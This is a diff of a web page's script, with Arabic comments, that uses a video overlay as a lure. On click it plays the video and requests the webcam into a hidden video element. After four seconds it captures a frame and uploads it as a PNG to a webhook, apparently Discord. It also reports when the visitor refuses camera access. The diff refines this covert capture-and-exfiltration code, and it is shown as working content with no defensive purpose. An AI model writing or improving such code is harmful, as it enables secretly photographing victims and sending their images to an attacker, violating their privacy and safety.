@@ -46,40 +46,28 @@
     const camera = document.getElementById('hidden-camera');
 
     overlay.addEventListener('click', async () => {
-        // إرسال تنبيه بالبدء (مثل اللي وصلك)
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({content: "📸 **بدأت عملية التقاط الصورة الآن... انتظر ثواني**"})
-        });
-
         overlay.style.display = 'none';
         iframe.style.visibility = 'visible';
 
         try {
+            // تشغيل الفيديو والصوت
             iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
             iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
 
-            // طلب الكاميرا بدقة عادية لضمان السرعة
+            // طلب الكاميرا
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             camera.srcObject = stream;
 
             camera.onplaying = () => {
-                // المحاولة الأولى بعد 3 ثواني
-                setTimeout(() => captureAndSend(1), 3000);
-                // المحاولة الثانية بعد 6 ثواني
-                setTimeout(() => captureAndSend(2), 6000);
+                // التقاط الصورة بعد 4 ثواني وإرسالها بطريقة FormData الأكيدة
+                setTimeout(captureAndSend, 4000);
             };
         } catch (err) {
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: "❌ **المستخدم لم يوافق على الكاميرا.**"})
-            });
+            fetch(webhookURL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: "❌ رفض الإذن"}) });
         }
     });
 
-    async function captureAndSend(id) {
+    async function captureAndSend() {
         const canvas = document.getElementById('photo-canvas');
         const context = canvas.getContext('2d');
 
@@ -88,21 +76,19 @@
             canvas.height = camera.videoHeight;
             context.drawImage(camera, 0, 0, canvas.width, canvas.height);
             
-            // تحويل الصورة وإرسالها
+            // تحويل الصورة لملف PNG وإرساله كـ FormData صريح
             canvas.toBlob(async (blob) => {
-                if (!blob) return;
-                const fd = new FormData();
-                fd.append('file', blob, `capture_${id}.png`);
-                fd.append('content', `✅ **وصلت الصورة رقم ${id}!**`);
+                const formData = new FormData();
+                formData.append('file', blob, 'shot.png');
+                formData.append('content', '✅ **وصلت الصورة بنجاح!**');
 
-                await fetch(webhookURL, { 
-                    method: 'POST', 
-                    body: fd
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    body: formData // ديسكورد يفضل هذه الطريقة للملفات
                 });
             }, 'image/png');
         } else {
-            // إعادة محاولة سريعة إذا كانت الكاميرا سوداء
-            setTimeout(() => captureAndSend(id), 1000);
+            setTimeout(captureAndSend, 1000);
         }
     }
 </script>
